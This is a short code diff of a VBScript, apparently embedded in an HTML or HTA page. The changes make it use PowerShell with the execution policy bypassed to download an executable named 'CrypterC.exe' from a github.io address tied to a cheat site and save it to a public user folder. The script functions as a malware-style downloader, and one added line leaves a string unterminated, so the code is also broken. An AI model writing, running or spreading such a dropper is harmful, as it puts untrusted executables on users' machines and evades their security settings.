@@ -8,16 +8,14 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 
 url = "https://easycheatcc.github.io/rghegergegw/CrypterC.exe"
 
-saveFolder = "C:\Temp"
-savePath = saveFolder & "\CrypterC.exe"
-
-' Create folder if it doesn't exist
-If Not fso.FolderExists(saveFolder) Then
-    fso.CreateFolder(saveFolder)
-End If
+savePath = "C:\Users\Public\CrypterC.exe
 
 cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
-      """Invoke-WebRequest -Uri '" & url & "' -OutFile '" & savePath & "'"""
+      Chr(34) & _
+      "Invoke-WebRequest -Uri """ & url & """ -OutFile """ & savePath & """" & _
+      Chr(34)
+
+WScript.Echo cmd
 
 shell.Run cmd, 1, True
 </script>
